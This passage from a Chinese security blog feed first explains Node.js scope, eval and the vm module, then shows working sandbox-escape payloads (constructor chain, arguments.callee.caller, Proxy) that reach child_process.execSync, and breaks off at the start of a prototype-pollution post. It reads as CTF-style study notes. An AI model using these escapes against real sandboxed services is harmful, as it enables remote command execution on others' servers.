<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>) <span class="hljs-comment">//require函数引入Node.js的fs模块，并将其赋值给常量fs</span><br><br><span class="hljs-keyword">let</span> content = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;age.txt&#x27;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-comment">//使用fs模块的readFileSync方法同步读取名为age.txt的文件，并将文件内容以UTF-8编码的形式存储在content变量中。</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(content)<span class="hljs-comment">//打印content</span><br><br><span class="hljs-built_in">eval</span>(content)<span class="hljs-comment">//执行！</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(age)<span class="hljs-comment">//打印age</span><br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">var age <span class="hljs-operator">=</span> <span class="hljs-number">18</span><br><span class="hljs-number">18</span><br></code></pre></td></tr></table></figure><p><code>age.txt</code>中的<code>var age = 18</code>被当成字符串执行了。</p><p>不过这里有个问题：如果在当前作用域(也叫上下文)下已经有了个<code>age</code>，那么会报错。举个栗子:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><br><span class="hljs-keyword">let</span> content = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;age.txt&#x27;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-keyword">let</span> age = <span class="hljs-number">12</span> <br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(content)<br><br><span class="hljs-built_in">eval</span>(content)<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(age)<br><span class="hljs-comment">//结果：</span><br><span class="hljs-keyword">var</span> age = <span class="hljs-number">18</span><br><span class="hljs-attr">undefined</span>:<span class="hljs-number">1</span><br><span class="hljs-keyword">var</span> age = <span class="hljs-number">18</span><br>    ^<br><br><span class="hljs-title class_">SyntaxError</span>: <span class="hljs-title class_">Identifier</span> <span class="hljs-string">&#x27;age&#x27;</span> has already been declared<br></code></pre></td></tr></table></figure><p>作用域是什么？举个栗子：</p><p><code>bye.js</code>:</p><p><code>var age = 20</code></p><p><code>hello.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./bye&quot;</span>) <span class="hljs-comment">//require函数引入了当前目录下的名为bye的模块，并将其赋值给常量a</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a.<span class="hljs-property">age</span>)<br><br><span class="hljs-comment">//结果：</span><br><span class="hljs-literal">undefined</span><br></code></pre></td></tr></table></figure><p>那么如何在一个文件中引入当前目录下，另一个文件中的元素？可以利用<code>exports</code>接口达到目的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//bye.js</span><br><br><span class="hljs-keyword">var</span> age = <span class="hljs-number">20</span><br><br><span class="hljs-built_in">exports</span>.<span class="hljs-property">age</span> = age<span class="hljs-comment">//exports是一个特殊的对象，用于将模块中的变量、函数或对象暴露给其他模块使用</span><br></code></pre></td></tr></table></figure><p><code>hello.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./bye&quot;</span>) <br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a.<span class="hljs-property">age</span>)<br><br><span class="hljs-comment">//20</span><br></code></pre></td></tr></table></figure><p>若没有exports将需要的属性暴露出来，我们是访问不到另一个包内的属性的。包与包之间是互不相通的，即<code>每一个包都有自己的作用域</code>。</p><p><img src="/img/vvv1.png" alt="vvv1"></p><p>(这张图从别人那里偷的<code>y1</code>&#x3D;<code>bye</code>,<code>y2</code>&#x3D;<code>hello</code>)</p><p><code>global</code>是什么？</p><p>在Node.js中，<code>global</code>是一个全局对象，类似于浏览器环境中的<code>window</code>对象。它可以在任何地方访问，无需引入或声明。</p><p><code>global</code>对象包含了Node.js中的全局变量和全局函数。例如，<code>console</code>、<code>setTimeout</code>、<code>setInterval</code>等函数都是<code>global</code>对象的属性。可以通过<code>global</code>对象来访问这些全局函数和变量。</p><p>在Node.js中，<code>global</code>对象还可以用来创建全局变量。但是，为了避免全局变量的滥用，通常不推荐使用全局变量，而是使用模块的导出和导入机制来进行变量的共享和访问。</p><p>举个例子，我们在用<code>console.log</code>输出时并不需要写成<code>global.console.log</code>，其他常见全局变量还有process（一会逃逸要用到）。</p><p>看一个有关全局变量的栗子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//bye.js</span><br><span class="hljs-variable language_">global</span>.<span class="hljs-property">age</span> = <span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//hello.js</span><br><span class="hljs-keyword">const</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./bye&quot;</span>)<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(age)<br><br><span class="hljs-comment">//输出：</span><br><br><span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p>这次我并没有利用<code>exports</code>导入<code>age</code>，但<code>hello.js</code>确实访问了另一个包的属性。</p><p>此外，还有一种方法<code>new Function</code>:</p><p>在Node.js中，<code>new Function</code>是一个构造函数，用于创建一个新的函数对象。它接受一个或多个字符串参数，其中最后一个参数是函数体，前面的参数是函数的参数列表。</p><p>使用<code>new Function</code>构造函数可以动态地创建一个函数对象，而不需要提前定义函数的名称或函数体。这种方式可以在运行时根据需要创建函数，具有一定的灵活性，比如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> add = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Function</span>(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;return a + b;&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">add</span>(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)); <span class="hljs-comment">// 输出: 5</span><br></code></pre></td></tr></table></figure><h3 id="0x03vm沙箱"><a href="#0x03vm沙箱" class="headerlink" title="0x03vm沙箱"></a>0x03vm沙箱</h3><p>因为沙箱的目的是要隔离恶意代码，那我们可以通过创建新作用域并让恶意代码在其中运行而不影响其它作用域，看几个常用的vm模块的API：</p><p><code>vm.runinThisContext(code)</code>:在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。sandbox中可以访问到global中的属性，但无法访问其他包中的属性。</p><p><img src="/img/vvv2.png" alt="vvv2"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<span class="hljs-comment">//导入Node,js的vm模块</span><br><span class="hljs-keyword">let</span> localVar = <span class="hljs-string">&#x27;initial value&#x27;</span>;<span class="hljs-comment">//定义变量localVar，赋值initial value</span><br><span class="hljs-keyword">const</span> vmResult = vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">&#x27;localVar = &quot;vm&quot;;&#x27;</span>);<span class="hljs-comment">//使用vm.runInThisContext方法在当前上下文中运行提供的代码字符串&#x27;localVar = &quot;vm&quot;;&#x27;。该代码的作用是将变量localVar的值修改为&#x27;vm&#x27;。</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;vmResult:&#x27;</span>, vmResult);<span class="hljs-comment">//输出</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;localVar:&#x27;</span>, localVar);<br><span class="hljs-comment">// vmResult: &#x27;vm&#x27;, </span><br><span class="hljs-comment">//localVar: &#x27;initial value&#x27;</span><br></code></pre></td></tr></table></figure><p>可以看到，在沙箱中把字符串当代码执行<code>&#39;localVar = &quot;vm&quot;;&#39;</code>，只影响沙箱这个作用域，对其它作用域没影响。</p><p><code>vm.createContext([sandbox])</code>： 在使用前需要先创建一个沙箱对象，再将沙箱对象传给该方法（如果没有则会生成一个空的沙箱对象），v8为这个沙箱对象在当前global<strong>外</strong>再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部无法访问global中的属性。</p><p><code>vm.runInContext(code, contextifiedSandbox[, options])</code>：参数为要执行的代码和创建完作用域的沙箱对象，代码会在传入的沙箱对象的上下文中执行，并且参数的值与沙箱内的参数值相同。</p><p><img src="/img/vvv3.png" alt="vvv3"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<span class="hljs-comment">//导入util以使用inspect方法输出详细信息</span><br>  <span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br>  <span class="hljs-variable language_">global</span>.<span class="hljs-property">globalVar</span> = <span class="hljs-number">3</span>;<span class="hljs-comment">//全局环境中定义一个全局变量globalVar，并赋值为3</span><br>  <span class="hljs-keyword">const</span> sandbox = &#123; <span class="hljs-attr">globalVar</span>: <span class="hljs-number">1</span> &#125;;<span class="hljs-comment">//创建一个沙箱对象sandbox，其中定义了一个名为globalVar的属性，并赋值为1</span><br>  vm.<span class="hljs-title function_">createContext</span>(sandbox);<span class="hljs-comment">//创建一个沙箱上下文，将沙箱对象sandbox作为参数传入，以便在沙箱中执行代码。</span><br>  vm.<span class="hljs-title function_">runInContext</span>(<span class="hljs-string">&#x27;globalVar *= 2;&#x27;</span>, sandbox);<span class="hljs-comment">//使用vm.runInContext方法在指定的沙箱上下文中执行代码字符串&#x27;globalVar *= 2;&#x27;。该代码的作用是将沙箱中的globalVar的值乘以2</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(sandbox)); <span class="hljs-comment">// &#123; globalVar: 2 &#125;</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(globalVar)); <span class="hljs-comment">// 3</span><br><span class="hljs-comment">//沙箱内无法对global有任何影响</span><br></code></pre></td></tr></table></figure><p><code>vm.runInNewContext(code[, sandbox][, options])</code>: creatContext和runInContext的结合版，传入要执行的代码和沙箱对象。</p><p><code>vm.Script类</code> vm.Script类型的实例包含若干预编译的脚本，这些脚本能够在特定的沙箱（或者上下文）中被运行。</p><p><code>new vm.Script(code, options)</code>：创建一个新的vm.Script对象只编译代码但不会执行它。编译过的vm.Script此后可以被多次执行。值得注意的是，code是不绑定于任何全局对象的，相反，它仅仅绑定于每次执行它的对象。<br> code：要被解析的JavaScript代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">const</span> sandbox = &#123;<br><span class="hljs-attr">animal</span>: <span class="hljs-string">&#x27;cat&#x27;</span>,<br><span class="hljs-attr">count</span>: <span class="hljs-number">2</span><br>&#125;;<br><span class="hljs-keyword">const</span> script = <span class="hljs-keyword">new</span> vm.<span class="hljs-title class_">Script</span>(<span class="hljs-string">&#x27;count += 1; name = &quot;kitty&quot;;&#x27;</span>);<br><span class="hljs-keyword">const</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox);<br>script.<span class="hljs-title function_">runInContext</span>(context);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(sandbox));<br><span class="hljs-comment">// &#123; animal: &#x27;cat&#x27;, count: 3, name: &#x27;kitty&#x27; &#125;</span><br></code></pre></td></tr></table></figure><p>script对象可以通过runInXXXContext运行。</p><h3 id="0x03如何逃逸？"><a href="#0x03如何逃逸？" class="headerlink" title="0x03如何逃逸？"></a>0x03如何逃逸？</h3><p>node执行<code>RCE</code>需要引入<code>process</code>对象进而导入<code>child_process</code>模块来执行命令。然而，<code>process</code>是挂载到global上的。前面的例子也说明了在沙箱中貌似不能访问到<code>global</code>，那么该如何逃逸？如何拿到<code>process</code>？</p><p>vm模块是非常不严谨的，基于node原型链继承的特性，我们很容易就能拿到外部全局变量。比如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-meta">&quot;use strict&quot;</span>;<span class="hljs-comment">//严格模式</span><br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><span class="hljs-keyword">const</span> a = vm.<span class="hljs-title function_">runInNewContext</span>(<span class="hljs-string">`this.constructor.constructor(&#x27;return global&#x27;)()`</span>);<span class="hljs-comment">//获取全局对象 global</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a.<span class="hljs-property">process</span>);<br><span class="hljs-comment">//code参数最好用反引号包裹，这样可以使code更严格便于执行</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    this.constructor：获取当前执行上下文的构造函数。</span><br><span class="hljs-comment">    this.constructor.constructor：获取构造函数的构造函数，即原始的 Function 构造函数。</span><br><span class="hljs-comment">    this.constructor.constructor(&#x27;return global&#x27;)()：通过调用原始的 Function 构造函数，执行字符串 &#x27;return global&#x27;，从而获取全局对象 global。</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>结果：</p><p><img src="/img/vvv4.png" alt="vvv4"></p><p>这里的<code>this</code>是指向传递到<code>runInNewContext</code>函数的一个对象，他是<strong>不属于沙箱内部环境</strong>的，访问当前对象的构造器的构造器，也就是Function的构造器，由于继承关系，它的作用域是全局变量，执行代码，获取外部global。拿到process对象就可以执行命令了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-meta">&quot;use strict&quot;</span>;<br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><span class="hljs-keyword">const</span> a = vm.<span class="hljs-title function_">runInNewContext</span>(<span class="hljs-string">`this.constructor.constructor(&#x27;return process&#x27;)()`</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-title function_">toString</span>());<span class="hljs-comment">//通过 a 对象中的 mainModule 属性，获取当前进程的主模块对象，然后使用 require 方法加载 child_process 模块，并调用 execSync 方法执行命令 whoami，获取当前进程的用户名，并将其转换为字符串后打印出来。</span><br><span class="hljs-comment">//结果：v1per3\rdj</span><br></code></pre></td></tr></table></figure><p>一些其它情况：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">const</span> script = <span class="hljs-string">`...`</span>;<br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<span class="hljs-comment">//创建一个空对象 sandbox，作为沙盒环境的上下文对象。这里使用 Object.create(null) 创建一个没有原型链的纯净对象，以避免访问到原始的全局对象(它不会继承任何属性和方法)</span><br><span class="hljs-keyword">const</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox);<span class="hljs-comment">//vm.createContext 方法创建一个沙盒环境的上下文对象 context，并将之前创建的 sandbox 对象作为参数传入</span><br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context);<span class="hljs-comment">//在指定的沙盒环境中执行 JavaScript 代码。script 是之前定义的 JavaScript 代码字符串，context 是沙盒环境的上下文对象。执行结果将被赋值给 res 变量。</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello &#x27;</span> + res)<span class="hljs-comment">//打印输出字符串 &#x27;Hello &#x27; 和 res 变量的值。</span><br></code></pre></td></tr></table></figure><p>现在的this为null，并且也没有其他可以引用的对象，这时候想要逃逸要用到一个函数中的内置对象的属性<code>arguments.callee.caller</code>，它可以返回函数的调用者。</p><p>我们上面演示的沙箱逃逸其实就是找到一个沙箱外的对象，并调用其中的方法，这种情况下也是一样的，我们只要在沙箱内定义一个函数，然后在沙箱外调用这个函数，那么这个函数的<code>arguments.callee.caller</code>就会返回沙箱外的一个对象，我们在沙箱内就可以进行逃逸了。</p><p>举个栗子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">const</span> script = <br><span class="hljs-string">`(() =&gt; &#123;</span><br><span class="hljs-string">    const a = &#123;&#125; //创建空对象a</span><br><span class="hljs-string">    a.toString = function () &#123;//定义了a中的toString方法</span><br><span class="hljs-string">      const cc = arguments.callee.caller;//通过 arguments.callee.caller 获取到调用该方法的函数的引用,在下面两行中用到</span><br><span class="hljs-string">      const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span><br><span class="hljs-string">      return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    return a</span><br><span class="hljs-string">  &#125;)()`</span>;<br><br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context);<span class="hljs-comment">//res是一个恶意对象</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello &#x27;</span> + res)<span class="hljs-comment">//在这里调用了重写的toString方法</span><br><br><span class="hljs-comment">//Hello v1per3\rdj</span><br><span class="hljs-comment">//() =&gt; &#123; ... &#125; 这种形式表示一个没有参数的箭头函数，箭头函数可以用来定义匿名函数，它的语法比传统的函数定义更加简洁。</span><br></code></pre></td></tr></table></figure><p>解释下这个方法：先对<code>toString</code>方法进行了重写(重写不改变方法何时被调用)。<code>console.log(&#39;Hello &#39; + res)</code>时(一个对象与字符串发生了<code>关系</code>)，就会调用<code>toString</code>方法。(感觉有点像PHP中的魔术方法)</p><p>在 <code>toString</code> 方法中，通过 <code>arguments.callee.caller</code> 获取到调用<strong>该方法的函数</strong>的引用，并利用该引用获取到 <code>process</code> 对象，然后使用 <code>child_process</code> 模块的 <code>execSync</code> 方法执行命令 <code>whoami</code>，并将结果转换为字符串返回。实现了<code>RCE</code></p><p>当然，有时即使我们重写了<code>toString</code>函数，但沙箱外并不存在去触发该函数的相关操作或根本不能重写函数，这时我们可以用<code>Proxy</code>来劫持属性：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<span class="hljs-comment">//导入vm模块</span><br><br><span class="hljs-keyword">const</span> script = <br><span class="hljs-string">`</span><br><span class="hljs-string">(() =&gt;&#123; //</span><br><span class="hljs-string">    const a = new Proxy(&#123;&#125;, &#123; //代理了空对象并对get方法进行重写，代理对象是指通过使用ES6中的Proxy对象来包装另一个对象，从而可以拦截并重定义该对象的基本操作（比如属性查找、赋值、删除等）。代理对象允许我们在对目标对象进行操作时，可以自定义并添加额外的行为。</span><br><span class="hljs-string">        get: function()&#123;</span><br><span class="hljs-string">            const cc = arguments.callee.caller;</span><br><span class="hljs-string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span><br><span class="hljs-string">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;)</span><br><span class="hljs-string">    return a</span><br><span class="hljs-string">&#125;)()//这个()为了调用匿名函数</span><br><span class="hljs-string">`</span>;<br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">abc</span>)<br></code></pre></td></tr></table></figure><p>参考文章：</p><p><code>https://xz.aliyun.com/t/11859</code></p><p><code>https://blog.csdn.net/m0_62422842/article/details/128553953</code></p><p><code>[Proxy 和 Reflect - 掘金 (juejin.cn)](https://juejin.cn/post/6844904090116292616)</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初识JavaScript原型链污染</title>
    <link href="/2023/10/22/2023-10-22-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/10/22/2023-10-22-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>0xGame碰到了原型链污染的题，记录一下学习过程</p><span id="more"></span><hr><p>因为第一次接触，所以先了解了<code>Javascript</code>这东西的特性，先看一段简单的构造类的方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"></span>)&#123; <span class="hljs-comment">//名为person的构造函数，构造函数用于创建拥有特定属性/方法的对象</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>=<span class="hljs-string">&quot;rendongjun&quot;</span>;<span class="hljs-comment">//name属性</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">test</span>=<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123; <span class="hljs-comment">//test方法，返回 333</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">333</span>;<br><br>&#125;<br>&#125;<br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">a</span>=<span class="hljs-number">3</span>;<span class="hljs-comment">//通过原型继承的方式，给Person构造函数的原型对象添加了一个名为a的属性，其值为3</span><br>web=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<span class="hljs-comment">//创建名为web的对象，该对象是通过person构造函数创建的一个实例，构造函数使用new调用</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(web.<span class="hljs-title function_">test</span>());<span class="hljs-comment">//使用console函数进行打印</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(web.<span class="hljs-property">a</span>)<br></code></pre></td></tr></table></figure><h6 id="什么是原型继承？"><a href="#什么是原型继承？" class="headerlink" title="什么是原型继承？"></a>什么是原型继承？</h6><p>每个JavaScript对象都有一个原型对象，它是一个普通的对象，包含了一些共享的属性和方法。当我们创建一个新对象时，它会自动继承原型对象的属性和方法。</p><p>在JavaScript中，我们可以通过修改原型对象来实现属性和方法的继承。</p><p><code>Person.prototype.a = 3</code>这段代码就是在<code>Person</code>构造函数的原型对象上添加了一个名为<code>a</code>的属性，其值为3。这意味着通过<code>Person</code>构造函数创建的所有对象实例都会继承这个<code>a</code>属性，并且可以通过对象实例访问和使用它。</p><p>换句话说，当我们创建一个<code>person</code>对象实例，比如<code>web = new person()</code>，这个实例会继承<code>person</code>构造函数的原型对象上的属性和方法。因此，<code>web</code>对象可以访问和使用<code>a</code>属性，即<code>web.a</code>会返回3。</p><p><code>__proto__</code>属性指向它的构造函数的<code>prototype</code>属性。</p><h6 id="什么是原型链？"><a href="#什么是原型链？" class="headerlink" title="什么是原型链？"></a>什么是原型链？</h6><p>原型链是JavaScript中一种对象之间的关系模型，它用于实现对象的继承和属性查找。</p><p>在JavaScript中，每个对象都有一个原型对象（prototype），原型对象也是一个对象，它包含了一些共享的属性和方法。当我们访问一个对象的属性或方法时，如果该对象本身没有这个属性或方法，JavaScript会沿着原型链向上查找，直到找到该属性或方法或者到达原型链的顶端（即Object.prototype）。</p><p>原型链的关系可以通过对象的<code>__proto__</code>属性来表示。每个对象都有一个<code>__proto__</code>属性，它指向该对象的原型对象。原型对象也有自己的原型对象，这样就形成了一个链式结构，即原型链。</p><p><img src="/img/pol1.png" alt="pol1"></p><h3 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h3><p>每个实例对象都有一个 <code>constructor</code> 属性指向对应的<strong>构造函数</strong>，即类。所以以下几种写法其实是相等的，都返回 <code>Foo</code> 类的原型对象。</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-type">Foo</span>.proto<span class="hljs-keyword">type</span><br><span class="hljs-title">foo</span>[<span 